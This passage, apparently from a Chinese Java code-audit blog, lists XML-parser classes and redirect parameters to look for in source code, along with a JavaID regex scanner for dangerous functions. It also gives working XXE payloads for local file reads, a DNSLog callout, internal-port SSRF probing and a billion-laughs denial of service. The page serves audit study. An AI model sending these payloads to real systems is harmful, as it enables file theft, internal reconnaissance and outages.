<h2 id="关键字-2"><a href="#关键字-2" class="headerlink" title="关键字"></a>关键字</h2><p>XMLReaderFactory<br>createXMLReader<br>SAXBuilder<br>SAXReader<br>SAXParserFactory<br>newSAXParser<br>Digester<br>DocumentBuilderFactory<br>DocumentBuilder<br>XMLReader<br>DocumentHelper<br>XMLStreamReader<br>SAXParser<br>SAXSource<br>TransformerFactory<br>SAXTransformerFactory<br>SchemaFactory<br>Unmarshaller<br>XPathExpression<br>javax.xml.parsers.DocumentBuilder<br>javax.xml.parsers.DocumentBuilderFactory<br>javax.xml.stream.XMLStreamReader<br>javax.xml.stream.XMLInputFactory<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>org.jdom.output.XMLOutputter<br>oracle.xml.parser.v2.XMLParser<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader<br>org.dom4j.DocumentHelper<br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource<br>javax.xml.transform.TransformerFactory<br>javax.xml.transform.sax.SAXTransformerFactory<br>javax.xml.validation.SchemaFactory<br>javax.xml.validation.Validator<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XPathExpression<br>java.beans.XMLDecoder</p>
<h2 id="XXE-payload"><a href="#XXE-payload" class="headerlink" title="XXE payload"></a>XXE payload</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/Users/powerful/Desktop/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="请求-DNSLog"><a href="#请求-DNSLog" class="headerlink" title="请求 DNSLog"></a>请求 DNSLog</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://dnslog地址&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="SSRF-探测内网（这个拿本地3306测试了一下，失败了）"><a href="#SSRF-探测内网（这个拿本地3306测试了一下，失败了）" class="headerlink" title="SSRF 探测内网（这个拿本地3306测试了一下，失败了）"></a>SSRF 探测内网（这个拿本地3306测试了一下，失败了）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:6379&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="DoS-攻击（本地测了一些好像没啥用）"><a href="#DoS-攻击（本地测了一些好像没啥用）" class="headerlink" title="DoS 攻击（本地测了一些好像没啥用）"></a>DoS 攻击（本地测了一些好像没啥用）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">lolz</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">lol1</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol2 &quot;</span>&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol3 &quot;</span>&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol4 &quot;</span>&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol5 &quot;</span>&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol6 &quot;</span>&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol7 &quot;</span>&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol8 &quot;</span>&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY lol9 &quot;</span>&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;tag&gt;&amp;lol9;&lt;/tag&gt;</span></span></span></span><br></pre></td></tr></table></figure>



<h1 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h1><h2 id="关键字-3"><a href="#关键字-3" class="headerlink" title="关键字"></a>关键字</h2><p>redirect<br>url<br>redirectUrl<br>callback<br>return_url<br>toUrl<br>ReturnUrl<br>fromUrl<br>redUrl<br>request<br>redirect_to<br>redirect_url<br>jump<br>jump_to<br>target<br>to<br>goto<br>link<br>linkto<br>domain<br>oauth_callback</p>
<h2 id="301-重定向-setHeader"><a href="#301-重定向-setHeader" class="headerlink" title="301 重定向 - setHeader"></a>301 重定向 - setHeader</h2><p>301跳转也叫301重定向，也叫301转向，也叫301永久重定向,是网站建设过程中的一个功能。<strong>一般用于2个域名指向同一个网站</strong>。 一般来说，利用跳转，对网站的排名不会有影响。但不会转移全部权重。只能说让损失降到最低。</p>
<h2 id="302-重定向-sendRedirect"><a href="#302-重定向-sendRedirect" class="headerlink" title="302 重定向 - sendRedirect"></a>302 重定向 - sendRedirect</h2><p>302跳转就网址重定向的一种，它区别于301跳转，301是网址永久重定向，302则是网址的临时定向。302转向或者302重定向（302 redirect）指的是当浏览器要求一个网页的时候，主机所返回的状态码。302状态码的意义是暂时转向到另外一个网址。</p>
<h1 id="搜索敏感函数的脚本"><a href="#搜索敏感函数的脚本" class="headerlink" title="搜索敏感函数的脚本"></a>搜索敏感函数的脚本</h1><p>来自<a class="link" target="_blank" rel="noopener" href="https://github.com/Cryin/JavaID%EF%BC%8C%E4%BF%AE%E6%94%B9%E4%BA%86%E4%B8%80%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%A2%9E%E5%8A%A0%E4%BA%86%E4%B8%80%E4%BA%9B%E8%A7%84%E5%88%99%EF%BC%8C%E4%BC%98%E5%8C%96%E4%BA%86%E4%B8%80%E4%B8%8B%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C">https://github.com/Cryin/JavaID，修改了一部分代码，增加了一些规则，优化了一下输出结果<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="javaid-py"><a href="#javaid-py" class="headerlink" title="javaid.py"></a>javaid.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># java source danger function identify prog</span></span><br><span class="line"><span class="comment"># Auth by Cryin&#x27;</span></span><br><span class="line"><span class="comment"># Modify by This_is_Y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml.html <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件：漏洞类型，具体类型，文件名，匹配到的这行代码，文件路径，</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># logging.basicConfig(filename=&#x27;example.log&#x27;, encoding=&#x27;utf-8&#x27;, level=logging.DEBUG)</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">javaid</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,<span class="built_in">dir</span></span>):</span></span><br><span class="line"></span><br><span class="line">        self._function = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._fpanttern = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._line = <span class="number">0</span></span><br><span class="line">        self._<span class="built_in">dir</span> = <span class="built_in">dir</span></span><br><span class="line">        self._shortfilename = <span class="string">&#x27;&#x27;</span>     <span class="comment"># 文件名</span></span><br><span class="line">        self._filename = <span class="string">&#x27;&#x27;</span>     <span class="comment"># 文件路径</span></span><br><span class="line">        self._vultype = <span class="string">&#x27;&#x27;</span>      <span class="comment"># 漏洞类型</span></span><br><span class="line">        self._code = <span class="string">&#x27;&#x27;</span>         <span class="comment"># 匹配到的这行代码，文件路径</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.banner()</span><br><span class="line">            self.handlePath(self._<span class="built_in">dir</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]【JavaID】identify danger function Finished!&quot;</span>    )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">report_id</span>(<span class="params">self,vul</span>):</span></span><br><span class="line">        <span class="comment"># print( &quot;[+]【&quot;+vul+&quot;】identify danger function [&quot;+self._function+&quot;] in file [&quot;+self._filename+&quot;]&quot;)</span></span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;[+]【&quot;</span>+self._vultype+<span class="string">&quot;】【&quot;</span>+self._function+<span class="string">&quot;】【&quot;</span>+ self._shortfilename + <span class="string">&quot;】 &quot;</span>+self._filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def report_line(self):</span></span><br><span class="line">    <span class="comment">#     print( &quot; --&gt; [+] on line : &quot;+ str(self._line))</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handlePath</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        用递归遍历所有的文件名，并发给handleFile()方法去处理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dirs = os.listdir(path) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> dirs:</span><br><span class="line">            subpath = os.path.join(path, d) </span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(subpath):</span><br><span class="line">                <span class="keyword">if</span> os.path.splitext(subpath)[<span class="number">1</span>] == <span class="string">&#x27;.java&#x27;</span> <span class="keyword">or</span> os.path.splitext(subpath)[<span class="number">1</span>] == <span class="string">&#x27;.xml&#x27;</span>:</span><br><span class="line">                    self._filename =subpath</span><br><span class="line">                    (_, self._shortfilename) = os.path.split(subpath)</span><br><span class="line">                    self.handleFile(subpath)</span><br><span class="line">                    <span class="comment"># logging.info(subpath)</span></span><br><span class="line">                    <span class="comment"># input(&quot;&gt;&gt;&quot;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.handlePath(subpath) </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleFile</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        打开文件，经过remove_comment处理后，发给check_regexp去使用正则处理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#print &#x27;begin read file:&#x27; + fileName</span></span><br><span class="line">        f = <span class="built_in">open</span>(fileName, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">        self._line = <span class="number">0</span></span><br><span class="line">        content = f.read()</span><br><span class="line">        content=self.remove_comment(content)</span><br><span class="line">        self.check_regexp(content)</span><br><span class="line"></span><br><span class="line">        f.close() </span><br><span class="line">        <span class="comment">#print &#x27;read over file:&#x27; + fileName</span></span><br><span class="line">        <span class="comment">#print &#x27;------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span>(<span class="params">self,result</span>):</span></span><br><span class="line">        fl = <span class="built_in">open</span>(self._filename, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">        self._line =<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            line = fl.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            self._line += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">in</span> line:</span><br><span class="line">                self._code = line.strip()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;line:&quot;</span>,self._line,<span class="string">&quot; code: \033[1;31m&quot;</span>,self._code,<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">regexp_search</span>(<span class="params">self,rule_dom,content</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        传入rule_dom,content，通过rule_dom来找到对应的规则，每条规则可以对应多个正则</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        regmatch_dom = rule_dom[<span class="number">0</span>].xpath(<span class="string">&quot;regmatch&quot;</span>)</span><br><span class="line">        regexp_doms = regmatch_dom[<span class="number">0</span>].xpath(<span class="string">&quot;regexp&quot;</span>) <span class="keyword">if</span> regmatch_dom != <span class="literal">None</span> <span class="keyword">else</span> []</span><br><span class="line">        <span class="keyword">for</span> regexp_dom <span class="keyword">in</span> regexp_doms:</span><br><span class="line">                exp_pattern = re.<span class="built_in">compile</span>(regexp_dom.text)</span><br><span class="line">                result = exp_pattern.findall(content)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">                        <span class="comment"># logging.info(&quot;=======result ========&quot;+i)</span></span><br><span class="line">                    <span class="comment">#print( &quot;identify sfunction is : &quot;+self._function)</span></span><br><span class="line">                        self.report_id(self._vultype)</span><br><span class="line">                        self.get_code(i)</span><br><span class="line">                        <span class="comment"># print(&quot;&quot;)</span></span><br><span class="line">                    <span class="comment"># self.function_search_line()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_regexp</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        使用正则搜索文件内容中的关键字</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._xmlstr_dom = etree.parse(regexp)</span><br><span class="line">        javaid_doms = self._xmlstr_dom.xpath(<span class="string">&quot;javaid&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> javaid_dom <span class="keyword">in</span> javaid_doms:</span><br><span class="line">            self._vultype =javaid_dom.get(<span class="string">&quot;vultype&quot;</span>)</span><br><span class="line">            <span class="comment">#print( &quot;vul_type &quot;+self._vultype)</span></span><br><span class="line">            function_doms = javaid_dom.xpath(<span class="string">&quot;function&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> function_dom <span class="keyword">in</span> function_doms:</span><br><span class="line">                rule_dom = function_dom.xpath(<span class="string">&quot;rule&quot;</span>)</span><br><span class="line">                self._function =rule_dom[<span class="number">0</span>].get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">                self.regexp_search(rule_dom,content)</span><br><span class="line">                <span class="comment">#print( &quot;check_regexp search ...&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">banner</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;[-]【JavaID】 Danger function identify tool&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">&#x27;usage: python %prog [options](eg: python %prog -d /user/java/demo)&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dir&#x27;</span>, dest = <span class="string">&#x27;dir&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span> = <span class="string">&#x27;source code file dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    path = os.path.dirname(__file__)</span><br><span class="line">    regexp = path+<span class="string">&quot;/regexp.xml&quot;</span></span><br><span class="line">    <span class="keyword">if</span> options.<span class="built_in">dir</span> == <span class="literal">None</span> <span class="keyword">or</span> options.<span class="built_in">dir</span> == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">dir</span> =options.<span class="built_in">dir</span></span><br><span class="line">    javaidentify = javaid(<span class="built_in">dir</span>)</span><br><span class="line">    javaidentify._run()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="regexp-xml"><a href="#regexp-xml" class="headerlink" title="regexp.xml"></a>regexp.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span 